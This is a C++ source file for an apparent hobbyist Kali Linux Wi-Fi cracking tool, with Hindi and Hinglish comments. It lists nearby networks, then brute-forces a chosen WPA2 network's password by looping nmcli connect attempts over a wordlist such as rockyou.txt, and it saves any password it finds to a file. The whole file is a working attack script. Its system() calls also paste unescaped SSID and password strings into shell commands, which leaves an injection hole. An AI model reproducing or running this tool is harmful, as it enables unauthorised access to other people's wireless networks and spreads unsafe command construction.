#include <iostream>
#include <iwlib.h>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

int main() {
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "        RONNIE WIFI PRO (KALI LINUX)       " << endl;
    cout << "===========================================" << RESET << endl;

    string card;
    cout << "ENTER_INTERFACE (e.g., wlan0): ";
    getline(cin, card);

    // वाई-फाई स्कैनिंग (Kali Linux के लिए nmcli सबसे बेस्ट है)
    cout << YELLOW << "[*] Scanning for Networks..." << RESET << endl;
    system("nmcli dev wifi list");

    string target_ssid, wordlist_path;
    cout << CYAN << "\nTarget SSID: " << RESET; 
    getline(cin >> ws, target_ssid);

    cout << CYAN << "Wordlist Path (e.g., /usr/share/wordlists/rockyou.txt): " << RESET;
    getline(cin >> ws, wordlist_path);

    ifstream file(wordlist_path);
    if (!file.is_open()) {
        cerr << RED << "Error: Wordlist file nahi mili! Path check karein." << RESET << endl;
        return 1;
    }

    string current_password;
    bool success = false;
    int line_number = 0;

    cout << YELLOW << "\n[!] Starting Attack on: " << target_ssid << RESET << endl;

    while (getline(file, current_password)) {
        line_number++;
        
        // पासवर्ड क्लीनिंग (हटाना \r या \n)
        if (!current_password.empty() && (current_password.back() == '\r' || current_password.back() == '\n')) {
            current_password.pop_back();
        }

        if (current_password.length() < 8) continue; // WPA2 minimum 8 chars

        cout << "[LINE " << line_number << "] TRYING: " << current_password << flush;

        // पुराने कनेक्शन प्रोफाइल को डिलीट करना ताकि फ्रेश अटेम्प्ट हो सके
        string del_cmd = "nmcli connection delete id \"" + target_ssid + "\" > /dev/null 2>&1";
        system(del_cmd.c_str());

        // nmcli के ज़रिए कनेक्ट करने का प्रयास
        string command = "nmcli dev wifi connect \"" + target_ssid + "\" password \"" + current_password + "\" > /dev/null 2>&1";
        
        int ret = system(command.c_str());

        if (ret == 0) {
            cout << GREEN << " -> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << current_password << RESET << endl;
            
            // फाइल में सेव करें
            ofstream saveFile("found_pass.txt", ios::app);
            if (saveFile.is_open()) {
                saveFile << "SSID: " << target_ssid << " | Password: " << current_password << endl;
                saveFile.close();
                cout << CYAN << "[*] Password 'found_pass.txt' me save kar diya gaya hai." << RESET << endl;
            }
            
            success = true;
            break; // सही पासवर्ड मिलते ही रुकें
        } else {
            cout << RED << " -> [FAILED]" << RESET << endl;
        }
        
        // नेटवर्क कार्ड को रिसेट होने का समय दें (थोड़ा तेज़ किया गया है)
        usleep(300000); 
    }

    if (!success) cout << RED << "\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;

    file.close();
    return 0;
}
